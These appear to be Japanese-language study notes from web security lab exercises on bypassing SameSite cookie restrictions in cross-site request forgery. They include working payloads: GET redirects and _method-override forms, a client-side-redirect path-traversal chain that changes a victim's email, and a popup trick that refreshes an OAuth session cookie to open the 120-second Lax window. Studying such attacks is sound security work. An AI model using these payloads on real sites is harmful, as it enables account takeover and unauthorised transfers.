## GETリクエストを使用したSameSite=Lax制限のバイパス
###### 基本原理

- GETを使用した最上位レベルのナビゲーションなら、ブラウザは被害者のCookieを含む
```js
<script>
    document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
</script>
```

- もしGETが許可されていなくても、==メソッドを上書きする==。フレームワークにはメソッドの上書きが可能なプロパティが用意されていることが多い
- `_method`パラメタ：大多数の基本的なphpフレームワークでサポートされている
```html
<form action="https://vulnerable-website.com/account/transfer-payment" method="GET">
    <input type="hidden" name="_method" value="POST">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>
```
	or
```js
document.location = "https://vuln/my-account/change-email?email=hoge@example.com&_method=POST";
```

###### ステップ

1. `SameSite=Lax` 、もしくはブラウザがChromeで`SameSite`が設定されていない(自動でLaxに設定される)場合

2. "Change request method"でGETでもアクションを実行できるか？
3. ステップ2の結果にあわせたペイロードをエクスプロイトサーバに保存して被害者にDeliver
- ↓yes:
```js
<script>
    document.location = 'https://TARGET_NET/[action_path]?[param]=[value]';
</script>
```
- ↓no：`<form>`のmethodをGETに変更し、中にmethod上書きを加える
```html
<form action="https://TARGET_NET/my-account/change-email" method="GET">
      <input type="hidden" name="email" value="hoge&#64;hoge11" />
      <input type="hidden" name="_method" value="POST">
```

## client-side redirectによるSameSite=Strict制限バイパス

###### cliend-side redirectとは

- サーバを経由しないリダイレクト。ユーザからしたら何もしてないのに自動で遷移するやつ
 ![[Pasted image 20240105221800.png | 300]]

- 通常のサーバサイドリダイレクトではCookieがリクエストに含まれないが、これは含まれる
- 主にJavaScriptファイルによるリダイレクト
![[Pasted image 20240105222012.png | 400]]

- サーバサイドリダイレクトとは実際異なり、==独立した単体のリクエストを追加で同じSiteに==送信するのでリクエストにCookieが含まれる
- 例えば、攻撃者がURLパラメータ(`#`など）を操作することで動的にリダイレクト先を構築する方法などがある(参考：[3. open redirection](../DOM-based%20vuln/3.%20open%20redirection.md#DOM-based%20open%20redirectionとは))
- このテクニックを使えば、リクエストを任意の外部Siteから送信してもSameSite=StrictをバイパスしてCookieをリクエストに含める。

###### 参考記事

- [client-side redirectとserver-side redirectの違い](https://keywordmap.jp/academy/redirect/#i-6)
###### ステップ

1. `SameSite=Strict`の場合
2. 怪しげなJavaScriptファイルを閲覧し、リダイレクト用のパスがユーザが制御可能な値によって動的に生成されていることを確認する
- ↓例
```js
const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
```

2. 制御可能なパラメタ値を、存在しない値に変更し挙動を確認する
```
/post/comment/confirmation?postId=foo
```

3. 制御可能な値に[Path traversal](../../Server-side/Path%20traversal/Path%20traversal.md#Traversal%20sequences)を使用して任意のページへGETリクエストできるか確かめる
```
/post/comment/confirmation?postId=1/../../my-account
```

4. エクスプロイトサーバに以下のスクリプトをホストし、View Exploit。外部からCookieを含めてリクエストを送信できることを確認する
```js
<script>
    document.location = "https://TARGET_NET/post/comment/confirmation?postId=../my-account";
</script>
```
![[Pasted image 20240105223141.png | 300]]

5. 実行させたいアクションを含めてペイロードを作成する
```js
<script>
    document.location = "https://TARGET_NET/post/comment/confirmation?postId=../my-account/change-email?email=test@example%26submit=1";
</script>
```
- ⚠️：URLにおいて`&`は現在のパラメタの終端と次のパラメタの開始を表すので、この場合はパラメタ`postId`の値としてすべて解釈して欲しいので、単純な文字として解釈させるためにurlエンコードした(`&`->`%26`)

## SameSite属性が明示されないLax制限のcookieリフレッシュによるバイパス

### CookieリフレッシュでのCSRFステップ

###### 成功条件の確認

- OAuthのログインフロー内でレスポンスに`Set-Cookie`があり、かつ、`SameSite=Lax`が設定されていないリクエストはあるか？
```http
Set-Cookie: session=3Qno8XiZ0LPzK6vZQ3M6OiKpND6lQNNi; 
```

- OAuthのログインフロー開始前と完了後で、session cookieが変更されていることを確認する
- session cookieが変更されるきっかけとなるリクエストを探す

###### ポップアップブロックとLax制限のバイパス

1. 以下をエクスプロイトサーバにホストし、被害者に2回連続でDeliverする
```http
<form method="POST" action="https://TARGET_NET/my-account/change-email">
    <input type="hidden" name="email" value="[目的のメアド]">
</form>
<p>Click anywhere on the page</p>
<script>
    window.onclick = () => {
        window.open('https://TARGET_NET/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>
```

### 基本原理
###### SameSite=Laxと明示されない場合の攻撃ベクター

- ChromeではSameSite属性を明示しないと自動でLaxが適用される。
- この自動で適用されたLaxに欠陥がある
- 最上位レベルのナビゲーションでPOSTリクエストなら、クロスサイトであっても、120秒間は制限を適用しない。
	- これはSSOの仕組みが壊れないようにするため。
	- 標準的な挙動：[1. CSRFの基本と対策](1.%20CSRFの基本と対策.md#Lax)
- この120秒間の制限なしがクロスサイトでの攻撃ウィンドウとなる。

###### 攻撃概要

- (120秒の間に被害者にcsrfさせるのは難しいので)被害者に新しいcookieを発行させることを可能にする方法をサイト上で見つける
- 👊Cookieを新しく発行させる -> 120秒のウィンドウ発生 -> その間に目的のCSRF

#### OAuthでのCookie refresh概要

- [1. OAuth認証の脆弱性とその特定](../../Advanced/OAuth/1.%20OAuth認証の脆弱性とその特定.md)
- OAuthのログインフローが完了すると、==すでにログインしていたとしても==、都度新しいセッションとそのcookieが発行される可能性がある
- その場合、必ず、OAuthのログインフロー完了後は120秒の攻撃ウィンドウが発生する

###### 難：最上位レベルのナビゲーションを使う

- ナビゲーションのリクエストには現在のOAuthセッションに関連するCookieが含まれる
- ユーザをエクスプロイトサーバにリダイレクトしてCSRF攻撃を仕掛ける必要があるため難しい

###### 簡単：新しいタブを開くことでsession Cookieを更新する

- 新しいタブを開くことで、ユーザが現在見ているページから離れることなく、背後でCookieがリフレッシュされる
- ユーザが元のページに留まっている間に、攻撃者はsession Cookieを利用したCSRFを実行する

- しかし、ブラウザは自動ポップアップをブロックする
```js
window.open('https://vulnerable-website.com/login/sso');
```

- そのため、ページ上のどこかをクリックしたら新しいタブを開くようにする
```js
window.onclick = () => {
    window.open('https://vulnerable-website.com/login/sso');
}
```
